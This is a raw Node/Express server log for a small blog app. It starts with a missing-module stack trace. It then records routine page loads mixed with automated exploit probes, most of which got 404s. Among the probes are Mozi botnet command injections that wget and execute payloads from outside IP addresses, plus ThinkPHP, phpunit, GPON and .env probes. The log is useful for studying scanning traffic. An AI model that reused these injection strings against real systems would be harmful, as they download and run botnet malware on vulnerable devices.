internal/modules/cjs/loader.js:969
  throw err;
  ^

Error: Cannot find module './routes/blogAdd'
Require stack:
- /home/bitnami/blogger/app.js
- /home/bitnami/blogger/bin/www
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blogger/app.js:9:21)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [ '/home/bitnami/blogger/app.js', '/home/bitnami/blogger/bin/www' ]
}
Port 3000 is already in use
[0mGET /system_api.php [33m404 [0m0.894 ms - 913[0m
[0mGET /streaming/clients_live.php [33m404 [0m1.747 ms - 913[0m
[0mGET /stalker_portal/c/ [33m404 [0m0.878 ms - 913[0m
[0mGET /api.php [33m404 [0m0.915 ms - 913[0m
[0mGET /login.php [33m404 [0m0.865 ms - 913[0m
[0mGET /streaming [33m404 [0m0.775 ms - 913[0m
[0mGET /streaming/clients_live.php [33m404 [0m0.863 ms - 913[0m
[0mGET /streaming/DHTqFwXEE.php [33m404 [0m0.879 ms - 913[0m
[0mGET / [32m200 [0m0.699 ms - 954[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://116.75.66.150:35401/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.940 ms - 913[0m
[0mGET / [32m200 [0m0.803 ms - 954[0m
[0mPOST /HNAP1/ [33m404 [0m0.818 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.766 ms - 913[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.443 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.217.47:44574/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.985 ms - 913[0m
[0mGET / [32m200 [0m0.839 ms - 954[0m
[0mGET /portal/redlion [33m404 [0m0.932 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.940 ms - 913[0m
[0mGET http://httpheader.net/azenv.php [33m404 [0m0.968 ms - 913[0m
[0mGET /t [33m404 [0m9.999 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.733 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m10.935 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.792 ms - 954[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.780 ms - 954[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.907 ms - 913[0m
[0mGET /ReportServer [33m404 [0m0.929 ms - 913[0m
[0mGET / [32m200 [0m0.739 ms - 954[0m
[0mGET /.env [33m404 [0m0.798 ms - 913[0m
[0mPOST / [33m404 [0m0.821 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.923 ms - 913[0m
[0mGET / [32m200 [0m0.773 ms - 954[0m
[0mGET /hudson [33m404 [0m0.903 ms - 913[0m
[0mGET / [32m200 [0m0.799 ms - 954[0m
[0mGET / [32m200 [0m0.603 ms - 954[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.849 ms - 913[0m
[0mGET http://httpheader.net/azenv.php [33m404 [0m0.877 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.943 ms - 913[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.945 ms - 913[0m
[0mGET / [32m200 [0m0.751 ms - 954[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.913 ms - 913[0m
[0mGET / [32m200 [0m0.738 ms - 954[0m
[0mGET /blogAdd [36m304 [0m13.792 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m3.762 ms - 111[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.630 ms - 913[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.805 ms - 160302[0m
[0mGET /js/jquery.min.js [33m404 [0m1.831 ms - 913[0m
[0mGET /js/bootstrap.min.js [32m200 [0m1.617 ms - 60044[0m
[0mGET /blogAdd [36m304 [0m1.162 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.830 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.692 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.248 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.286 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.560 ms - -[0m
[0mGET / [36m304 [0m10.787 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m3.478 ms - 111[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.011 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.203 ms - 913[0m
[0mGET /css/bootstrap.min.css [32m200 [0m5.831 ms - 160302[0m
[0mGET /js/bootstrap.min.js [32m200 [0m0.725 ms - 60044[0m
[0mGET /favicon.ico [33m404 [0m0.951 ms - 913[0m
[0mGET /blogList [32m200 [0m3.408 ms - 945[0m
[0mGET /stylesheets/style.css [36m304 [0m0.527 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.318 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.024 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m0.999 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.444 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.575 ms - 940[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.633 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.376 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.492 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m4.204 ms - 913[0m
[0mGET /blogList [36m304 [0m1.483 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.466 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.766 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.246 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.054 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.541 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.385 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.945 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.193 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.251 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.755 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.612 ms - -[0m
